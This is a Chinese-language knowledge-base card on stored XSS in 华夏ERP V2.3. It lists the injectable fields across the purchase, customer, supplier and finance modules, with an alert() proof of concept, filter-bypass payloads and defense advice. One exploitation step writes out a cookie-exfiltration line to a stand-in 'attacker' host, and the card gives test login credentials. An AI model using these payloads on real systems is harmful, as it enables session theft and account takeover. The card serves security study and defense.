---
id: web-generic-xss-xiahuia-erp-multi-module-stored
title: 华夏ERP V2.3 多业务模块存储型 XSS：采购商品、客户、供应商与收支项目字段未编码
type: scenario
domain: web
path: web/generic/xss
technique: erp-multi-module-stored-xss
tags:
- xss
- stored-xss
- java
- erp
- xiahuia
- input-validation
- output-encoding
cve: []
severity: high
confidence: medium
status: verified
affected_versions: 华夏ERP V2.3（原文测试版本）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V194
  verified_at: '2026-11-06T23:43:25+08:00'
  notes: 已对照原文与47张图核对：华夏ERP V2.3、采购订单商品（名称/规格/单位/型号/颜色/安全存量/条码）、客户信息（名称/联系人/手机/电话/邮箱/传真/地址/备注）、供应商名称、收入单项目均以 alert 弹窗验证；已把卡片中的'安全库存'按界面更正为'安全存量'；affected_versions 与既有华夏ERP卡一致采用 V2.3（原文测试版本）。未复跑。
url: /docs/web/generic/xss/web-generic-xss-xiahuia-erp-multi-module-stored/
draft: false
kb_aliases:
- 华夏ERP XSS
- 采购订单商品 XSS
- 客户信息 XSS
- 供应商名称 XSS
- 收支项目 XSS
- ERP 存储型 XSS
---

## 一句话结论

华夏ERP V2.3 的多个业务表单（采购订单新增商品的名称/规格/单位/型号/颜色/安全存量/条码，销售管理添加客户的名称/联系人/手机/电话/邮箱/传真/地址/备注，仓库管理的供应商名称，财务管理的收支单项目）把 `<script>alert(n)</script>` 原样保存并在列表/编辑页回显执行；攻击者登录后台后逐字段插入即可形成存储型 XSS，管理员打开对应列表时脚本在其会话中执行。

## 原理

- **存储型 XSS 的成立条件**：用户输入被持久化到数据库，之后在列表/详情/编辑页被直接拼进 HTML 响应，浏览器把其中的 `<script>` 当作代码执行。与反射型不同，payload 不需要诱导受害者点击特制链接，只要打开受影响的业务页面就会触发。
- **华夏ERP 的具体面**：采购订单“新增商品”弹窗中的多个文本框（名称、规格、单位、型号、颜色、安全存量、条码等）都可写入 `<script>alert(1)</script>`；保存后打开采购订单/商品列表即弹窗。销售管理“添加客户信息”中的客户名称、联系人、手机号码、联系电话、电子邮箱、传真、地址、备注等字段同样可写入并触发。仓库管理的供应商名称、财务管理的收入单/支出单“收入项目”字段也能触发。
- **为什么多个模块同时中招**：这些业务表单共用同一套实体/前端渲染逻辑，后端只做字段长度/类型的基础校验，没有对 `<`、`>`、`"`、`'` 做 HTML 实体编码；前端把返回值直接插入 DOM（如 jQuery `html()`/模板拼接），没有统一的安全编码层。因此不是单个页面的疏漏，而是“输入未过滤 + 输出未编码”的共性缺陷。
- **触发时机**：payload 在保存时写入数据库；之后每次打开包含该记录的列表/详情页都会执行，属于持久化、可重复触发的 XSS。若管理员/其他用户查看该数据，脚本在其浏览器上下文执行，可读取非 HttpOnly Cookie、发起带会话的请求、篡改页面内容。
- **危害**：ERP 后台通常有商品、客户、供应商、财务等敏感数据；存储型 XSS 可用于窃取管理员会话/CSRF token、以管理员身份操作、配合 CSRF 修改配置或导出数据。文章用 `alert()` 验证，未进一步利用。

## 触发条件

- 目标为华夏ERP V2.3，攻击者能登录后台（文章测试账号 `jsh` / `123456`），并拥有对应模块的新增/编辑权限。
- 业务表单字段未过滤 `<`、`>` 等 HTML 元字符，且保存后会在列表/详情页回显。
- 页面没有严格的 CSP，Cookie 未全部设置 HttpOnly（否则脚本仍可发起同会话请求，但窃取 Cookie 受限）。
- 受害者（通常是管理员或其他业务用户）打开包含恶意记录的列表/详情页。

## 利用步骤

1. 登录后台，进入“采购管理 → 采购订单 → 新增商品”，在名称、规格、单位、型号、颜色、安全存量、条码等输入框填入 `<script>alert(1)</script>` 并保存。
2. 打开采购订单/商品列表，确认弹窗；逐个字段测试可确定哪些字段被回显。
3. 进入“销售管理 → 添加客户信息”，在客户名称、联系人、手机号码、联系电话、电子邮箱、传真、地址、备注等字段重复测试。
4. 在“仓库管理 → 供应商名称”“财务管理 → 收入单/支出单 → 收入项目”重复测试，确认多模块均可触发。
5. 将 `alert(1)` 替换为窃取 Cookie/令牌或发起后台操作的脚本（如 `new Image().src='http://attacker/?c='+document.cookie`），等待管理员打开页面。
6. 若目标有 CSP/HttpOnly，改为利用页面内已有的 CSRF token 发起请求，或寻找可绕过的 DOM sink。

## PoC

```html
<script>alert(1)</script>
```

```text
# 文章验证的注入位置（表单字段）：
# 采购订单新增商品：名称、规格、单位、型号、颜色、安全存量、条码
# 销售管理添加客户：名称、联系人、手机号码、联系电话、电子邮箱、传真、地址、备注
# 仓库管理供应商：供应商名称
# 财务管理收支单：收入项目
# 保存后打开对应列表/详情页即触发 alert
```

## 变体与关联

- 变体：若后端过滤 `<script>`，可尝试 `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、大小写/双写/HTML 实体编码等绕过；具体取决于过滤实现（文章未给出服务端过滤代码）。
- 变体：同一 ERP 的多处列表/编辑页可能使用不同的前端渲染方式，payload 需要按上下文（HTML 文本、属性、JS 字符串）调整闭合方式。
- 关联：[[web-generic-xss-newbeemall-goods-detail-stored]]（商品详情存储型 XSS）、[[web-generic-xss-o2oa-rest-designer-mass-stored-xss]]（OA 多模块批量存储型 XSS）、[[web-generic-xss-admin-blind-stored-registration]]（后台盲打存储型 XSS）。
- 关联：同系统的 [[web-generic-auth-xiahuia-erp-logcostfilter-contains-path-bypass]]（未授权访问可扩大 XSS 记录的可见范围/触发面）和 [[web-generic-sqli-xiahuia-erp-account-search-json-like-injection]]（同一 `search` JSON 入口的 SQL 注入）。

## 检测与防御

- 输入层：对业务表单字段做长度与字符白名单校验，拒绝或转义 `<`、`>`、`"`、`'`、`&`；富文本使用白名单 sanitizer（如 OWASP Java HTML Sanitizer）。
- 输出层：按上下文做 HTML/属性/JS/URL 编码；前端避免 `innerHTML`/`html()` 直接插入用户数据，改用 `textContent` 或框架的自动转义。
- 会话层：Cookie 设置 `HttpOnly`、`Secure`、`SameSite`；启用 CSP 限制内联脚本与外部脚本源。
- 检测：请求体/表单字段中出现 `<script`、`onerror=`、`onload=`、`javascript:`；数据库中业务字段出现 HTML 标签；管理员浏览器出现异常外连。
- 响应：发现存储型 XSS 后清理历史恶意记录，审计管理员会话是否被劫持，轮换会话与密码。
